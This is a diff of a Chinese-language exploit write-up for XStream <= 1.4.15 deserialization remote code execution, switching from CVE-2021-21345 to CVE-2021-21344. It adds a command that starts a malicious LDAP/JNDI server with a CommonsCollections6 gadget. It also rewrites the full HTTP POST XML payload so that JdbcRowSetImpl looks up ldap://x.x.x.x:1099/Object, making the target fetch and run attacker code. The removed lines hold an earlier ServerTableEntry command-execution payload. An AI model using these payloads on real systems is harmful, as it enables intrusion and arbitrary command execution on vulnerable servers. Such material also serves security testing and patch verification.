@@ -1,8 +1,8 @@
-# Xstream <= 1.4.15 反序列化RCE（CVE-2021-21345）
+# Xstream <= 1.4.15 反序列化RCE（CVE-2021-21344）
 
 ## 漏洞描述
 
-Xstream <= 1.4.15 反序列化RCE， 无回显
+Xstream <= 1.4.15 反序列化RCE， JNDI注入
 
 ## writeup
 
@@ -12,12 +12,18 @@ Xstream <= 1.4.15 反序列化RCE， 无回显
 touch /tmp/success
 ```
 
+- 开启恶意JNDI服务（RMI/LDAP）
+
+```
+java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099 CommonsCollections6 "touch /tmp/success"
+```
+
 - POC
 
 ```
 POST /main.jsp HTTP/1.1
 Host: x.x.x.x:1234
-Content-Length: 2811
+Content-Length: 4630
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 Origin: http://x.x.x.x:1234
@@ -42,13 +48,13 @@ Connection: close
                 <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                   <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                     <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
-                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>
+                      <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>
                       <uriProperties/>
                       <attributeProperties/>
                       <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                         <getter>
-                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>
-                          <name>verify</name>
+                          <class>com.sun.rowset.JdbcRowSetImpl</class>
+                          <name>getDatabaseMetaData</name>
                           <parameter-types/>
                         </getter>
                       </inheritedAttWildcard>
@@ -72,8 +78,52 @@ Connection: close
                     </context>
                   </bridge>
                 </bridge>
-                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>
-                  <activationCmd>touch /tmp/success</activationCmd>
+                <jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
+                  <javax.sql.rowset.BaseRowSet>
+                    <default>
+                      <concurrency>1008</concurrency>
+                      <escapeProcessing>true</escapeProcessing>
+                      <fetchDir>1000</fetchDir>
+                      <fetchSize>0</fetchSize>
+                      <isolation>2</isolation>
+                      <maxFieldSize>0</maxFieldSize>
+                      <maxRows>0</maxRows>
+                      <queryTimeout>0</queryTimeout>
+                      <readOnly>true</readOnly>
+                      <rowSetType>1004</rowSetType>
+                      <showDeleted>false</showDeleted>
+                      <dataSource>ldap://x.x.x.x:1099/Object</dataSource>
+                      <params/>
+                    </default>
+                  </javax.sql.rowset.BaseRowSet>
+                  <com.sun.rowset.JdbcRowSetImpl>
+                    <default>
+                      <iMatchColumns>
+                        <int>-1</int>
+                        <int>-1</int>
+                        <int>-1</int>
+                        <int>-1</int>
+                        <int>-1</int>
+                        <int>-1</int>
+                        <int>-1</int>
+                        <int>-1</int>
+                        <int>-1</int>
+                        <int>-1</int>
+                      </iMatchColumns>
+                      <strMatchColumns>
+                        <string>foo</string>
+                        <null/>
+                        <null/>
+                        <null/>
+                        <null/>
+                        <null/>
+                        <null/>
+                        <null/>
+                        <null/>
+                        <null/>
+                      </strMatchColumns>
+                    </default>
+                  </com.sun.rowset.JdbcRowSetImpl>
                 </jaxbObject>
               </dataSource>
             </message>
